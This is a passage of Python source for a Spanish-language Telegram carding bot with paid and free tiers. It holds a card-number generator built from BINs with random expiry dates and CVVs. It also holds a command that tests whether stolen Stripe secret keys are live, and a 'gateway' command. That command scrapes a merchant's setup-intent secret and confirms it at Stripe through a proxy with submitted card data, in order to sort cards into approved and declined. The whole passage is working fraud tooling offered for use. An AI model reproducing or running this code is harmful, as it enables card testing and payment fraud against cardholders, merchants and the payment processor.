        anogen4 = random.randint(2023,2030)
    else:
        anogen4 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen4 = random.randint(1000,9999)
        else:
            cvvgen4 = random.randint(100,999)
    else:
        cvvgen4 = cvv

    s="0123456789"
    sinco = list(s)
    random.shuffle(sinco)
    result = ''.join(sinco)
    result = cc + result
    if cc[0] == "3":
        ccgen5 = result[0:15]
    else:
        ccgen5 = result[0:16]
    if mes == 'rnd':
        mesgen5 = random.randint(1,12)
        if len(str(mesgen5)) == 1:
            mesgen5 = "0" + str(mesgen5)
    else:
        mesgen5 = mes
    if ano == 'rnd':
        anogen5 = random.randint(2023,2030)
    else:
        anogen5 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen5 = random.randint(1000,9999)
        else:
            cvvgen5 = random.randint(100,999)
    else:
        cvvgen5 = cvv
    
    s="0123456789"
    seis = list(s)
    random.shuffle(seis)
    result = ''.join(seis)
    result = cc + result
    if cc[0] == "3":
        ccgen6 = result[0:15]
    else:
        ccgen6 = result[0:16]
    if mes == 'rnd':
        mesgen6 = random.randint(1,12)
        if len(str(mesgen6)) == 1:
            mesgen6 = "0" + str(mesgen6)
    else:
        mesgen6 = mes
    if ano == 'rnd':
        anogen6 = random.randint(2023,2030)
    else:
        anogen6 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen6 = random.randint(1000,9999)
        else:
            cvvgen6 = random.randint(100,999)
    else:
        cvvgen6 = cvv

    s="0123456789"
    siete = list(s)
    random.shuffle(siete)
    result = ''.join(siete)
    result = cc + result
    if cc[0] == "3":
        ccgen7 = result[0:15]
    else:
        ccgen7 = result[0:16]
    if mes == 'rnd':
        mesgen7 = random.randint(1,12)
        if len(str(mesgen7)) == 1:
            mesgen7 = "0" + str(mesgen7)
    else:
        mesgen7 = mes
    if ano == 'rnd':
        anogen7 = random.randint(2023,2030)
    else:
        anogen7 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen7 = random.randint(1000,9999)
        else:
            cvvgen7 = random.randint(100,999)
    else:
        cvvgen7 = cvv

    s="0123456789"
    ocho = list(s)
    random.shuffle(ocho)
    result = ''.join(ocho)
    result = cc + result
    if cc[0] == "3":
        ccgen8 = result[0:15]
    else:
        ccgen8 = result[0:16]
    if mes == 'rnd':
        mesgen8 = random.randint(1,12)
        if len(str(mesgen8)) == 1:
            mesgen8 = "0" + str(mesgen8)
    else:
        mesgen8 = mes
    if ano == 'rnd':
        anogen8 = random.randint(2023,2030)
    else:
        anogen8 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen8 = random.randint(1000,9999)
        else:
            cvvgen8 = random.randint(100,999)
    else:
        cvvgen8 = cvv

    s="0123456789"
    nueve = list(s)
    random.shuffle(nueve)
    result = ''.join(nueve)
    result = cc + result
    if cc[0] == "3":
        ccgen9 = result[0:15]
    else:
        ccgen9 = result[0:16]
    if mes == 'rnd':
        mesgen9 = random.randint(1,12)
        if len(str(mesgen9)) == 1:
            mesgen9 = "0" + str(mesgen9)
    else:
        mesgen9 = mes
    if ano == 'rnd':
        anogen9 = random.randint(2023,2030)
    else:
        anogen9 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen9 = random.randint(1000,9999)
        else:
            cvvgen9 = random.randint(100,999)
    else:
        cvvgen9 = cvv
    
    s="0123456789"
    diez = list(s)
    random.shuffle(diez)
    result = ''.join(diez)
    result = cc + result
    if cc[0] == "3":
        ccgen10 = result[0:15]
    else:
        ccgen10 = result[0:16]
    if mes == 'rnd':
        mesgen10 = random.randint(1,12)
        if len(str(mesgen10)) == 1:
            mesgen10 = "0" + str(mesgen10)
    else:
        mesgen10 = mes
    if ano == 'rnd':
        anogen10 = random.randint(2023,2030)
    else:
        anogen10 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen10 = random.randint(1000,9999)
        else:
            cvvgen10 = random.randint(100,999)
    else:
        cvvgen10 = cvv

    
    lista = str(ccgen) +"|" + str(mesgen) +"|" + str(anogen) +"|" + str(cvvgen)
    lista2 = str(ccgen2) +"|" + str(mesgen2) +"|" + str(anogen2) +"|" + str(cvvgen2)
    lista3 = str(ccgen3) +"|" + str(mesgen3) +"|" + str(anogen3) +"|" + str(cvvgen3)
    lista4 = str(ccgen4) +"|" + str(mesgen4) +"|" + str(anogen4) +"|" + str(cvvgen4)
    lista5 = str(ccgen5) +"|" + str(mesgen5) +"|" + str(anogen5) +"|" + str(cvvgen5)
    lista6 = str(ccgen6) +"|" + str(mesgen6) +"|" + str(anogen6) +"|" + str(cvvgen6)
    lista7 = str(ccgen7) +"|" + str(mesgen7) +"|" + str(anogen7) +"|" + str(cvvgen7)
    lista8 = str(ccgen8) +"|" + str(mesgen8) +"|" + str(anogen8) +"|" + str(cvvgen8)
    lista9 = str(ccgen9) +"|" + str(mesgen9) +"|" + str(anogen9) +"|" + str(cvvgen9)
    lista10 = str(ccgen10) +"|" + str(mesgen10) +"|" + str(anogen10) +"|" + str(cvvgen10)

    ccs.join(lista)
    cc1 = ''.join(lista2)
    cc2 = ''.join(lista3)
    cc3 = ''.join(lista4)
    cc4 = ''.join(lista5)
    cc5 = ''.join(lista6)
    cc6 = ''.join(lista7)
    cc7 = ''.join(lista8)
    cc8 = ''.join(lista9)
    cc9 = ''.join(lista10)

    cards = ''.join(ccs)
    cards2 = ''.join(cc2)
    cards3 = ''.join(cc3)
    cards4 = ''.join(cc4)
    cards5 = ''.join(cc5)
    cards6 = ''.join(cc6)
    cards7 = ''.join(cc7)
    cards8 = ''.join(cc8)
    cards9 = ''.join(cc9)
    apis187 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    result=apis187['status']
    banke=apis187['bank']
    bank=banke['name']
    brand=apis187['brand']
    bn=apis187['query']
    typ=apis187['type']
    lv=apis187['level']
    country1=apis187['country']
    country=country1['name']
    flag=country1['flag']
    bin1 = await message.reply(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    bin2 = await bin1.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [50%]</b>")
    time.sleep(3)
    bin3 = await bin2.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    bin4 = await bin3.edit_text(f"<b>💳GENERANDO CCS: {bn}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")

    if ID in admins:
        return await bin4.edit_text(f"""
- - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 - ↯ <code>{bn} - {brand} - {typ} - {lv}</code>
𝑩𝒂𝒏𝒌 - ↯ <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 - ↯ <code>{country} - {flag}</code>
- - - - - - - - - - - - - - - - - - - - -
<code>{cards2}</code>
<code>{cards3}</code>
<code>{cards4}</code>
<code>{cards5}</code>
<code>{cards6}</code>
<code>{cards7}</code>
<code>{cards8}</code>
<code>{cards9}</code>
- - - - - - - - - - - - - - - - - - - - -
𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱𝘀 𝗕𝘆 - ↯ <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
𝗠𝗼𝗻𝘁𝗼 {amount}
𝗢𝘄𝗻𝗲𝗿: @DiegoAkk
 """)

    else:
        return await bin4.edit_text(f"""
- - - - - - - - - - - - - - - - - - - - -
𝗜𝗻𝗳𝗼 - ↯ <code>{bn} - {brand} - {typ} - {lv}</code>
𝑩𝒂𝒏𝒌 - ↯ <code>{bank}</code>
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 - ↯ <code>{country} - {flag}</code>
- - - - - - - - - - - - - - - - - - - - -
<code>{cards2}</code>
<code>{cards3}</code>
<code>{cards4}</code>
<code>{cards5}</code>
<code>{cards6}</code>
<code>{cards7}</code>
<code>{cards8}</code>
<code>{cards9}</code>
- - - - - - - - - - - - - - - - - - - - -
𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱𝘀 𝗕𝘆 - ↯ <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
𝗠𝗼𝗻𝘁𝗼 {amount}
𝗢𝘄𝗻𝗲𝗿: @DiegoAkk
 """)

@iniciar.message_handler(commands=["info", "id", "me"], commands_prefix=comand)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    ID = message.from_user.id
    with open('admins1.txt', 'r') as file:
            if str(ID) in file.read():
                await message.reply(f'''
━━━━━━━━━━━━━
🔱 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿 🔱
━━━━━━━━━━━━━
[Ϟ] 𝗜𝗱 𝗨𝘀𝗲𝗿: <code>{user_id}</code>
[Ϟ] 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}
[Ϟ] 𝗕𝗼𝘁: @YoimiyaChkBot
[Ϟ] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk
[Ϟ] 𝑰𝒏𝒇𝒐 𝑩𝒚: <a href="tg://user?id={ID}">{first}</a> <b>[Seller]</b>
''')

            else:
                with open('admins.txt', 'r') as file:
                    if str(ID) in file.read():
                        Prm = "[Premium]"
                        await message.reply(f'''
━━━━━━━━━━━━━
🔱 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿 🔱
━━━━━━━━━━━━━
[Ϟ] 𝗜𝗱 𝗨𝘀𝗲𝗿: <code>{user_id}</code>
[Ϟ] 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}
[Ϟ] 𝗕𝗼𝘁: @YoimiyaChkBot
[Ϟ] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk
[Ϟ] 𝑰𝒏𝒇𝒐 𝑩𝒚: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
''')
                    else:
                        await message.reply(f"""
━━━━━━━━━━━━━
🔱 𝗜𝗻𝗳𝗼 𝗨𝘀𝗲𝗿 🔱
━━━━━━━━━━━━━
[Ϟ] 𝗜𝗱 𝗨𝘀𝗲𝗿: <code>{user_id}</code>
[Ϟ] 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{username}
[Ϟ] 𝗕𝗼𝘁: @YoimiyaChkBot
[Ϟ] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk
[Ϟ] 𝑰𝒏𝒇𝒐 𝑩𝒚: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>""")


@iniciar.message_handler(commands=['sk'], commands_prefix=comand)
async def helpsjjtr(message: types.Message):
    skkey = message.text[len('/sk '):]
    if not skkey:
        return await message.reply(
            f"""
<b>Ingresa bien la sk bb, ejemplo: </b>: <code>/sk sk_live_51Gnxxxxxxxxxxxxxxxxxxxxxxxxxxhrh8</code>
""")
    cc= "4543218722787334"
    cvc= "780"
    mes= "07"
    ano= "2026"

    headers={
    "Content-Type": "application/x-www-form-urlencoded"
    }

    data={
    "card[number]": cc,
    "card[cvc]": cvc,
    "card[exp_month]": mes,
    "card[exp_year]": ano
    }
    

    first = message.from_user.first_name
    ID = message.from_user.id
    bi = await message.reply(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [20%]</b>")
    bi2 = await bi.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [40%]</b>")
    time.sleep(3)
    bi3 = await bi2.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [70%]</b>")
    time.sleep(2)
    bi4 = await bi3.edit_text(f"<b>💳Checkeando SK: {skkey}\nᴄᴀʀɢᴀɴᴅᴏ: [100%]</b>")
   
    pos = requests.post(f"https://api.stripe.com/v1/tokens",
        data=data, headers=headers, auth=(skkey, ""))

    if 'Invalid API Key provided' in pos.text:
        with open('admins.txt', 'r') as file:
            if str(ID) in file.read():
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid API Key provided</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
            else:
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid API Key provided</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    elif 'api_key_expired' in pos.text:
        with open('admins.txt', 'r') as file:
            if str(ID) in file.read():
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>api_key_expired</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
            else:
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid API Key provided</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)

    elif 'testmode_charges_only' in pos.text:
        with open('admins.txt', 'r') as file:
            if str(ID) in file.read():
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>testmode_charges_only</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
            else:
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>testmode_charges_only</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    elif 'test_mode_live_card' in pos.text:
            with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>test_mode_live_card</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
                else:
                    await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐚𝐝 ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>test_mode_live_card</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
    else:
        with open('admins.txt', 'r') as file:
            if str(ID) in file.read():
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝗟𝗶𝘃𝗲 ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Sk_Live! ✅</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk
    """)
            else:
                await bi4.edit_text(f"""
━━━━━━━━━━━━━
🛡 𝙎𝙠 𝘾𝙝𝙠 🛡
━━━━━━━━━━━━━
[🝂] 𝙎𝙠: <code>{skkey}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: 𝗟𝗶𝘃𝗲 ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Sk_Live! ✅</b>
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{first}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


@iniciar.message_handler(commands=['str'], commands_prefix=comand)
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Cargando 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    ini = time.perf_counter()
           
    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else:
        ccs = message.text[len('/str '):]
    
    if not ccs:
        await contra.edit_text("🟠 [🝂] /str <b>Shopify+Braintree</b> | <b>Status: On</b> ✅")
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
        mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    session = requests.Session()
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']
    final = time.perf_counter()

    # REQUESTS INIT
            
    ttp_proxy  = "https://154.72.155.14:5678"

    proxies = { 
              "sock4"  : ttp_proxy,  
            }
#-----------------------------------------------------------------------------------------------
    session = requests.Session()
    req_1 = session.get('https://www.subbly.co/admin/auth/register', proxies=proxies).text
            #print(req_1)
    if 'Not allowed' in req_1:
        await message.reply(f"error con la proxy")
    seti_secret = req_1.split("window.intent = '")[1].split("'")[0]
    seti = seti_secret.split("_secret_")[0]
            
       
    headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        }

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=juan+moltares&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=66b0b062-ff6d-42f7-ae71-323cf9970d69e5c9e1&payment_method_data[sid]=a54abcfe-4809-4f9d-8f30-2b8c2280040181c17e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=115132&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rSL4eUmipHMkptbjal1vLN0F&client_secret={seti_secret}'
# REQUESTS INIT
            

    response = session.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', headers=headers, data=data)
    r = response.text
    print(r)
    if "succeeded" in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>CCN CARD / 2010 Card Issuer Declined CVV</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</code> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>CCN CARD / 2010 Card Issuer Declined CVV</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's security code is incorrect." in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</b> ✅</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>CCN CARD / 2010 Card Issuer Declined CVV</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</b> ✅</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>CCN CARD / 2010 Card Issuer Declined CVV</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")




    elif "Your card's expiration year is invalid." in r:
        
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment gateway is invalid</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</b> ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment gateway is invalid</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")



    elif "Your card does not support this type of purchase." in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
